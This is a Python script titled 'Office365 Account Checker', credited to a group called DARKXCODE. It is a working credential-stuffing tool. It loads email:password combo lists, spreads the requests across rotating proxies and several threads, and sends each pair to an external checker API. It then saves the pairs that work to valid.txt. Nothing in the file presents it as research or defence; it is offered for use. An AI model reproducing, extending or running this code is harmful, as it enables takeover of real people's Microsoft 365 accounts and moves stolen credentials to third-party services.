# ===========> DON'T CHANGE THIS
# SCRIPT : OFFICE365 ACCOUNT CHECKER
# VERSION : 3.5
# TELEGRAM AUTHOR : https://t.me/zlaxtert
# SITE : https://darkxcode.site/
# TEAM : DARKXCODE
# ================> END


import requests
import threading
import queue
import time
import os
import re
from colorama import *
from termcolor import colored
from configparser import ConfigParser
from urllib.parse import quote

#colors
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.LIGHTBLUE_EX
kuning = Fore.LIGHTYELLOW_EX
magenta = Fore.LIGHTMAGENTA_EX
white = Fore.LIGHTWHITE_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED

# BANNER 

banner = f"""

{merah}     ░{biru}██████{merah}   ░{biru}██████████{merah}░{biru}██████████{merah}░{biru}██████{merah}  ░{biru}██████{merah}  ░{biru}██████████{merah}  ░{biru}██████{merah}   ░{biru}██████{merah}  ░{biru}████████{reset} 
{merah}    ░{biru}██{merah}   ░{biru}██{merah}  ░{biru}██{merah}        ░{biru}██{merah}          ░{biru}██{merah}   ░{biru}██{merah}   ░{biru}██{merah} ░{biru}██{merah}         ░{biru}██{merah}   ░{biru}██{merah} ░{biru}██{merah}   ░{biru}██{merah} ░{biru}██{reset}        
{merah}   ░{biru}██{merah}     ░{biru}██{merah} ░{biru}██{merah}        ░{biru}██{merah}          ░{biru}██{merah}  ░{biru}██{merah}        ░{biru}██{merah}               ░{biru}██{merah} ░{biru}██{merah}       ░{biru}███████{reset}      
{merah}   {biru}██{merah}      ░{biru}██{merah} ░{biru}█████████{merah} ░{biru}█████████{merah}   ░{biru}██{merah}  ░{biru}██{merah}        ░{biru}█████████{merah}    ░{biru}█████{merah}  ░{biru}███████{merah}        ░{biru}██{reset}     
{merah}   ░{biru}██{merah}     ░{biru}██{merah} ░{biru}██{merah}        ░{biru}██{merah}          ░{biru}██{merah}  ░{biru}██{merah}        ░{biru}██{merah}               ░{biru}██{merah} ░{biru}██{merah}   ░{biru}██{merah} ░{biru}██{merah}   ░{biru}██ {reset}    
{merah}    ░{biru}██{merah}   ░{biru}██{merah}  ░{biru}██{merah}        ░{biru}██{merah}          ░{biru}██{merah}   ░{biru}██{merah}   ░{biru}██{merah} ░{biru}██{merah}         ░{biru}██{merah}   ░{biru}██{merah} ░{biru}██{merah}   ░{biru}██{merah} ░{biru}██{merah}   ░{biru}██ {reset}    
{merah}     ░{biru}██████{merah}   ░{biru}██{merah}        ░{biru}██{merah}        ░{biru}██████{merah}  ░{biru}██████{merah}  ░{biru}██████████{merah}  ░{biru}██████{merah}   ░{biru}██████{merah}   ░{biru}██████{merah}  {reset}    
                                                                                              {reset}
          {fr}    ===================================================================={reset}
                         |{fb} SCRIPT{reset}  :{fg} OFFICE365 ACCOUNT CHECKER      {reset} |
                         |{fb} VERSION{reset} :{fg} 3.5{reset}                             |
                         |{fb} AUTHOR {reset} :{fg} https://t.me/zlaxtert{reset}           |
                         |{fb} TEAM  {reset}  :{fr} DARKXCODE{white} X{yl} BLACKNETID{reset}          |
          {fr}    ===================================================================={reset}
"""


class Office365Checker:
    def __init__(self):
        self.config = ConfigParser()
        self.load_config()
        self.accounts_queue = queue.Queue()
        self.proxies_queue = queue.Queue()
        self.lock = threading.Lock()
        self.checked = 0
        self.total_accounts = 0
        self.valid_count = 0
        self.invalid_count = 0
        self.error_count = 0
        self.proxy_type = self.config['SETTINGS'].get('TYPE_PROXY', 'http')
        self.api_url = self.config['SETTINGS'].get('API', '')
        self.apikey = self.config['SETTINGS'].get('APIKEY', '')
        
    def load_config(self):
        if not os.path.exists('settings.ini'):
            self.create_default_config()
        self.config.read('settings.ini')
        
        # Validate required settings
        if self.config['SETTINGS']['APIKEY'] == 'PASTE_YOUR_API_KEY_HERE':
            print(f"{res}[{yl}!{res}]{fb} Please configure your API key in {yl}settings.ini{fb} {res}[{yl}!{res}]{fb}\n\n")
            exit()
        elif self.config['SETTINGS']['API'] == 'PASTE_YOUR_API_HERE':
            print(f"{res}[{yl}!{res}]{fb} Please configure your API in {yl}settings.ini{fb} {res}[{yl}!{res}]{fb}\n\n")
            exit()
        
        
    def create_default_config(self):
        self.config['SETTINGS'] = {
            'APIKEY': 'PASTE_YOUR_API_KEY_HERE',
            'API': 'PASTE_YOUR_API_HERE',
            'PROXY_AUTH': '',
            'TYPE_PROXY': 'http'
        }
        with open('settings.ini', 'w') as f:
            self.config.write(f)
        print(f"{res}[{yl}!{res}]{fb} Please configure your API & APIKEY in {yl}settings.ini{fb} {res}[{yl}!{res}]{fb}\n\n")
        
    def validate_email(self, email):
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email)
        
    def load_accounts(self, file_path):
        if not os.path.exists(file_path):
            print(f"{res}[{yl}!{res}]{fb} Accounts file {yl}{file_path}{fb} not found {res}[{yl}!{res}]{fb}\n\n")
            return False
            
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                    
                if '|' in line:
                    email, password = line.split('|', 1)
                elif ':' in line:
                    email, password = line.split(':', 1)
                else:
                    continue
                    
                if self.validate_email(email):
                    self.accounts_queue.put((email, password))
                    
        self.total_accounts = self.accounts_queue.qsize()
        return True
        
    def load_proxies(self, file_path):
        if not os.path.exists(file_path):
            return False
            
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    self.proxies_queue.put(line)
                    
        return True
        
    def checker_worker(self):
        while True:
            try:
                email, password = self.accounts_queue.get_nowait()
            except queue.Empty:
                break
                
            proxy = None
            if not self.proxies_queue.empty():
                try:
                    proxy = self.proxies_queue.get_nowait()
                    self.proxies_queue.put(proxy)
                except queue.Empty:
                    pass
                    
            self.check_account(email, password, proxy)
            self.accounts_queue.task_done()
            
    def check_account(self, email, password, proxy):
        params = {
            'lists': f'{email}:{password}',
            'apikey': self.apikey
        }
        
        if proxy:
            params.update({
                'proxy': proxy,
                'proxyAuth': self.config['SETTINGS'].get('PROXY_AUTH', ''),
                'type_proxy': self.proxy_type
            })
            
        try:
            response = requests.get(self.api_url + "/checker/office365/", params=params, timeout=30)
            data = response.json()
            
            with self.lock:
                self.checked += 1
                progress = f"{res}[{yl}>{res}]{fb} {yl}Checked {res}[{fr}{self.checked}{res}/{fg}{self.total_accounts}{res}]"
                status = data.get('data', {}).get('info', {}).get('msg', 'UNKNOWN RESPONSE')
                
                if data.get('data', {}).get('valid', False):
                    self.valid_count += 1
                    result_type = f"{hijau}VALID{reset}"
                    self.save_result('valid.txt', email, password, status)
                else:
                    self.invalid_count += 1
                    result_type = f"{merah}INVALID{reset}"
                    self.save_result('invalid.txt', email, password, status)
                    
                print(f" {progress} {result_type} | {biru}{email}{reset}:{biru}{password}{reset} | {kuning}{status}{reset} | {white}BY {magenta}DARKXCODE{white} V3.5{reset}")
                
        except Exception as e:
            with self.lock:
                self.checked += 1
                self.error_count += 1
                progress = f"{res}[{yl}>{res}]{fb} {yl}Checked {res}[{fr}{self.checked}{res}/{fg}{self.total_accounts}{res}]"
                print(f" {progress} {cyan}ERROR{reset} | {biru}{email}{reset}:{biru}{password}{reset} | {kuning}CONNECTION ERROR{reset} | {white}BY {magenta}DARKXCODE{white} V3.5{reset}")
                self.save_result('error.txt', email, password, f'CONNECTION ERROR')
                
    def save_result(self, filename, email, password, status):

        with open(f'result/{filename}', 'a', encoding='utf-8') as f:
            f.write(f'{email}:{password} | {status}\n')
            
    def start_checking(self, threads_count):
        workers = []
        for _ in range(threads_count):
            t = threading.Thread(target=self.checker_worker)
            t.daemon = True
            t.start()
            workers.append(t)
            
        while any(t.is_alive() for t in workers):
            time.sleep(1)
            
    def print_stats(self):
        print(f"{fr}={res}" * 60)
        print(f"{kuning}Total checked {reset}: {cyan}{self.checked}{reset}")
        print(f"{kuning}Valid accounts {reset}: {hijau}{self.valid_count}{reset}")
        print(f"{kuning}Invalid accounts {reset}: {kuning}{self.invalid_count}{reset}")
        print(f"{kuning}Error Checking {reset}: {merah}{self.error_count}{reset}")
        print(f"{res}[{yl}!{res}]{fb} Results saved in 'result' folder {res}[{yl}!{res}]{fb}")
        print(f"{fr}={res}" * 60)

def main():
    checker = Office365Checker()
    
    accounts_file = input(f"{res}[{yl}+{res}]{fb} Enter your lists file{fg} >> {fb}").strip()
    if not checker.load_accounts(accounts_file):
        return
        
    proxy_file = input(f"{res}[{yl}+{res}]{fb} Enter Proxy lists file {res}(press Enter to skip){fg} >> {fb}").strip()
    if proxy_file:
        checker.load_proxies(proxy_file)
        
    try:
        threads = int(input(f"{res}[{yl}+{res}]{fb} Enter number of Threads (5-10) (Recomended 2-5){fg} >> {fb}").strip())
        threads = max(5, min(10, threads))
    except ValueError:
        threads = 10
        
    print(f"\n{yl}Starting validation with {fg}{threads}{yl} threads{res}")
    print(f"{fr}={res}" * 60)
    
    start_time = time.time()
    checker.start_checking(threads)
    end_time = time.time()
    
    checker.print_stats()
    print(f"Time elapsed: {end_time - start_time:.2f} seconds")

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    os.makedirs('result', exist_ok=True)
    main()